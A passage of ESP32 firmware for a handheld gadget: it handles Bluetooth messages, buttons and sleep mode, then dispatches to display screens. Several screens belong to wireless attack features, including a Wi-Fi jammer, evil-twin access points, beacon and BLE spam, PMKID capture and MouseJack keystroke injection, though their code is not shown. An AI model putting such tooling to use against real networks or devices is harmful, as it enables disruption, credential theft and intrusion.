      waSender = (secondColon > 0) ? inputData.substring(3, secondColon) : "WhatsApp";
      String rawMsg = (secondColon > 0) ? inputData.substring(secondColon + 1) : inputData.substring(3);
      
      waMessage = ""; // Reset and sanitize
      for (int i = 0; i < rawMsg.length() && waMessage.length() < MAX_WA_MSG_LEN; i++) {
        char c = rawMsg.charAt(i);
        if (c >= 32 && c <= 126) waMessage += c;
      }
      isShowingWA = true;
      lastWaUpdate = currentMillis;
      currentUi = UI_MAIN; // Reset to MAIN on incoming WA message
    } 
    else if (inputData.startsWith("HTML:")) {
      webTemplate = inputData.substring(5);
      Serial.println("[SYSTEM] Web Template updated!");
      wakeUpCozmo(currentMillis);
    }
    else if (inputData.startsWith("EXT_SSID:")) {
      xSemaphoreTake(stringMutex, portMAX_DELAY);
      extenderSSID = inputData.substring(9);
      preferences.putString("ext_ssid", extenderSSID);
      xSemaphoreGive(stringMutex);
      Serial.println("[EXTENDER] Saved SSID: " + extenderSSID);
    }
    else if (inputData.startsWith("EXT_PASS:")) {
      xSemaphoreTake(stringMutex, portMAX_DELAY);
      extenderPassword = inputData.substring(9);
      preferences.putString("ext_pass", extenderPassword);
      xSemaphoreGive(stringMutex);
      Serial.println("[EXTENDER] Password saved.");
    }
    else if (inputData.length() > 0) {
      navInstruction = inputData.startsWith("NAV:") ? inputData.substring(4) : inputData;
      isShowingWA = false;
      lastNavUpdate = currentMillis;
      currentUi = UI_MAIN; // Reset to MAIN on navigation update
    }
    wakeUpCozmo(currentMillis);
  }

  // Notification Timeout (Auto-dismiss)
  if (isShowingWA && currentMillis - lastWaUpdate > NOTIF_TIMEOUT) isShowingWA = false;
  if (!isShowingWA && navInstruction != "" && currentMillis - lastNavUpdate > NOTIF_TIMEOUT) navInstruction = "";

  // 2. Button Controls
  if (currentMillis - lastBtnPress > BUTTON_DEBOUNCE_MS) {
    if (digitalRead(BTN_NEXT) == LOW) {
      lastBtnPress = currentMillis;
      handleNext(); // Call central handler
    }
    if (digitalRead(BTN_SELECT) == LOW) {
      lastBtnPress = currentMillis;
      handleSelect(); // Call central handler
    }
  }

  // 3. Auto-Sleep & Power Management
  if (!SerialBT.hasClient()) {
      if (!isSleeping && (currentMillis - lastActiveTime > TIME_TO_SLEEP)) {
          isSleeping = true; 
          sleepStartTime = currentMillis; 
          
          // Set low contrast for sleep mode
          u8g2.setContrast(SLEEP_CONTRAST_VAL); 
          Serial.println("[SYSTEM] Entering Sleep Mode. Contrast lowered.");
          
      } else if (isSleeping && (currentMillis - sleepStartTime > SLEEP_DURATION)) {
          isSleeping = false; 
          u8g2.setContrast(contrastValues[brightnessLevel]); 
          lastActiveTime = currentMillis - TIME_TO_SLEEP + 60000; 
          
          Serial.println("[SYSTEM] Reset Auto-Sleep Timer.");
      }
  } else {
      wakeUpCozmo(currentMillis); 
  }

  // 4. Display Rendering
  if (currentMillis - lastDisplayUpdate < (1000 / DISPLAY_REFRESH_HZ)) return;
  lastDisplayUpdate = currentMillis;

  if (currentUi == UI_MENU) drawMenu(); 
  else if (currentUi == UI_BRIGHTNESS) drawBrightnessUI(); // From MenuSystem.h
  else if (currentUi == UI_WIFI_SCAN) drawWiFiScanner();
  else if (currentUi == UI_MARAUDER_MENU) drawMarauderMenu(); // From MenuMarauder.h
  else if (currentUi == UI_MARAUDER_SNIFF) drawMarauderSniff(); // From MenuMarauder.h
  else if (currentUi == UI_WIFIJAMMER_MENU) drawWiFiJammerMenu(); // From MenuWiFi.h
  else if (currentUi == UI_WIFIJAMMER_RUN) drawWiFiJammerRun(); // From MenuWiFi.h
  else if (currentUi == UI_WIFI_SWEEP_RUN) drawWiFiSweepRun(); // From MenuWiFi.h
  else if (currentUi == UI_EVILTWIN_MENU) drawEvilTwinMenu(); // From MenuWiFi.h
  else if (currentUi == UI_EVILTWIN_RUN) drawEvilTwinRun(); // From MenuWiFi.h
  else if (currentUi == UI_BEACON_SPAM_MENU) drawBeaconSpamMenu(); // From MenuWiFi.h
  else if (currentUi == UI_BEACON_SPAM_RUN) drawBeaconSpamRun(); // From MenuWiFi.h
  else if (currentUi == UI_BLE_SPAM) drawBleSpam(); // From MenuBLE.h
  else if (currentUi == UI_WIFI_ANALYZER) drawWiFiAnalyzer(); // From MenuWiFi.h
  else if (currentUi == UI_PMKID_CAPTURE) drawPMKIDCapture(); // From MenuWiFi.h
  else if (currentUi == UI_WIFI_EXTENDER) drawWiFiExtenderRun(); // From MenuWiFi.h
  else if (currentUi == UI_NRF_MENU) drawNRFMenu(); // From MenuNRF.h
  else if (currentUi == UI_NRF_RUN) drawNRFRun(); // From MenuNRF.h
  else if (currentUi == UI_NRF_TARGET_SCAN) drawNRFTargetScan();
  else if (currentUi == UI_NRF_TARGET_SELECT) drawNRFTargetSelect();
  else if (currentUi == UI_MOUSEJACK_RUN) drawMouseJackRun(); // From MenuNRF.h
  else if (currentUi == UI_NRF_LISTEN_MOUSE) drawNRFListenUI("NRF LISTEN MOUSE");
  else if (currentUi == UI_NRF_LISTEN_KEYBOARD) drawNRFListenUI("NRF LISTEN KBD");
  else {
    if (isShowingWA) drawWADisplay(currentMillis);
    else drawMainDisplay(currentMillis);
  }
}
